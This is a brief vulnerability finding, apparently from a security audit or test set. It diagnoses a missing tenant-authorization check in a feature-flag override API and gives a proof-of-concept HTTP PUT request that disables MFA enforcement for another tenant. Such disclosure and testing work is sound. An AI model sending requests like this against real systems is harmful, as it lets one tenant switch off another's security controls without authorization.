diagnosis: The feature flag override handler accepts targetTenantId in the request body and writes override configurations into the node:sqlite database without verifying that req.user is an administrator of targetTenantId. Any authenticated tenant administrator can manipulate feature flag states for rival tenants, enabling unreleased beta features or disabling mission-critical security controls.
exploit_request:
PUT /api/feature-flags/mfa_mandatory_enforcement/overrides HTTP/1.1
Host: config-mesh.infra.net
Authorization: Bearer tenant_alpha_admin_token
Content-Type: application/json

{"targetTenantId": "tenant_competitor_beta", "enabled": false, "rules": {}}
